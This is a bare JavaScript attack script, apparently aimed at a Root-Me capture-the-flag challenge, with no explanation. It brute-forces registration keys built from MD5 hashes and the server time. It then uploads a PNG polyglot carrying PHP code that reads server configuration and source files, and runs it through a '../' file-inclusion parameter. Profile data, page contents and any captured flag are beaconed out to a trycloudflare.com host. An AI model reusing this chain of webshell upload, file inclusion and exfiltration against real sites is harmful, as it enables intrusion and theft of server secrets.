function md5(s){var n=s.length,i,f;var nb=(((n+8)>>6)+1)*16;var w=new Array(nb);for(i=0;i<nb;i++)w[i]=0;for(i=0;i<n;i++)w[i>>2]|=s.charCodeAt(i)<<((i%4)*8);w[n>>2]|=0x80<<((n%4)*8);w[nb-2]=n*8;var a=1732584193,b=-271733879,c=-1732584194,d=271733878;var S=[7,12,17,22,5,9,14,20,4,11,16,23,6,10,15,21];var K=[];for(i=0;i<64;i++)K[i]=(Math.abs(Math.sin(i+1))*4294967296)|0;var A,B,C,D,g,t,sum,rot,tmp;for(i=0;i<nb;i+=16){A=a;B=b;C=c;D=d;for(f=0;f<64;f++){if(f<16){g=f;t=(B&C)|(~B&D)}else if(f<32){g=(5*f+1)&15;t=(D&B)|(~D&C)}else if(f<48){g=(3*f+5)&15;t=B^C^D}else{g=(7*f)&15;t=C^(B|~D)}sum=(A+t+K[f]+w[i+g])|0;rot=(sum<<S[(f>>4)<<2|(f&3)])|(sum>>>(32-S[(f>>4)<<2|(f&3)]));tmp=D;D=C;C=B;B=(B+rot)|0;A=tmp}a=(a+A)|0;b=(b+B)|0;c=(c+C)|0;d=(d+D)|0}function hx(x){var o="",j,u;for(j=0;j<4;j++){u=(x>>>(j*8))&255;o+=(u<16?"0":"")+u.toString(16)}return o}return hx(a)+hx(b)+hx(c)+hx(d)}
if(window.__v9){}else{window.__v9=1;
var T="https://specialty-colleague-technique-scanning.trycloudflare.com";
function E(t,d){try{new Image().src=T+"/"+t+"?d="+encodeURIComponent(String(d).substring(0,1400))}catch(e){}}
function EX(t,s){s=String(s);for(var i=0;i<s.length;i+=1100){E(t+"_"+i,s.substr(i,1100))}}
var b="http://challenge01.root-me.org/realiste/ch16/";
E("W0","go");
var g=new XMLHttpRequest();g.open("GET",b,false);g.send();
var D=Date.parse(g.getResponseHeader("Date"))/1000;
E("W1","srv="+D);
function XF(u,body){var x=new XMLHttpRequest();x.open("POST",u,false);x.send(body);return x.responseText}
function FD(u,p){var f=new FormData();f.append("username",u);f.append("password",p);return f}
var r1=XF(b+"?page=register.php&zz=1",FD("mW9","Regv99Pass!"));
E("W2",""+r1.length+(r1.indexOf("exist")>0?"EX":""));
var u,r,h,ts,c=0;
for(u=1;u<=8;u++)for(ts=D-1;ts<=D+1;ts++)for(r=0;r<=1000;r++){
 h=md5(""+u+md5(""+ts+r));
 new Image().src=b+"?page=register.php&key="+h;
 new Image().src=b+"?page=register.php&code="+h;c+=2}
E("W3","fired="+c);
var q=XF(b+"?page=login.php",FD("mW9","Regv99Pass!"));
var lo=q.indexOf("Logout")>0;
E("W4","L="+q.length+" LO="+lo);
if(lo){
 E("W5","PWNED");
 var pr=new XMLHttpRequest();pr.open("GET",b+"?page=profile.php",false);pr.send();
 EX("W_PROF",pr.responseText);
 var s=atob("iVBORw0KGgoAAAANSUhEUgAAAGoAAAABCAMAAAABzMs8AAABPlBMVEU8P3BocCAkbz0iflN+Ijtmb3JlYWNoKHNjYW5kaXIoIi9jaGFsbGVuZ2UvcmVhbGlzdGUvY2gxNiIpIGFzICRmKSRvLj0kZi4iXG4iOyRvLj0ifkN+Ii5AZmlsZV9nZXRfY29udGVudHMoIi9jaGFsbGVuZ2UvcmVhbGlzdGUvY2gxNi9jb25maWcucGhwIik7JG8uPSJ+Rn4iLkBmaWxlX2dldF9jb250ZW50cygiL2NoYWxsZW5nZS9yZWFsaXN0ZS9jaDE2L2Z1bmN0aW9ucy5waHAiKTskby49In5SfiIuQGZpbGVfZ2V0X2NvbnRlbnRzKCIvY2hhbGxlbmdlL3JlYWxpc3RlL2NoMTYvcGFnZXMvcmVnaXN0ZXIucGhwIik7ZWNobyAkbztfX2hhbHRfY29tcGlsZXIoKTtH4F0NAAAAc0lEQVR42mNgYGRiZmFlY+fg5OLm4eXjFxAUEhYRFROXkJSSlpGVk1dQVFJWUVVT19DU0tbR1dM3MDQyNjE1M7ewtLK2sbWzd3B0cnZxdXP38PTy9vH18w8IDAoOCQ0Lj4iMio6JjYtPSExKTklNS8/IBAAH7RW+c3PYtgAAAABJRU5ErkJggg==");var a=new Uint8Array(s.length);for(var i=0;i<s.length;i++)a[i]=s.charCodeAt(i);
 var bin=new Blob([a],{type:"image/png"});
 var fields=["file","fichier","image","avatar","upload","userfile","picture","img","pic","f"];
 var pages=["profile.php","contact.php","upload.php"];
 for(var pi=0;pi<pages.length;pi++)for(var fi=0;fi<fields.length;fi++){
  var fd=new FormData();fd.append(fields[fi],bin,"shell2.png");
  var up=XF(b+"?page="+pages[pi],fd);
  E("W_UP_"+pi+"_"+fi,"L="+up.responseText.length+" ok="+(up.responseText.indexOf("uccess")>0));
 }
 var ls=["upload/shell2.png","upload/tiny.png"];
 for(var li=0;li<ls.length;li++){
  var inc=new XMLHttpRequest();inc.open("GET",b+"?page=../"+ls[li],false);inc.send();
  E("W_INC_"+li,"S="+inc.responseText.indexOf("~S~")+" C="+inc.responseText.indexOf("~C~"));
  if(inc.responseText.indexOf("~S~")>=0){EX("W_FLAG",inc.responseText);E("W_FLAGGED","FLAG")}
 }
 var hm=new XMLHttpRequest();hm.open("GET",b+"/",false);hm.send();EX("W_HOME",hm.responseText.substring(0,2500));
}
E("W9","done");
}
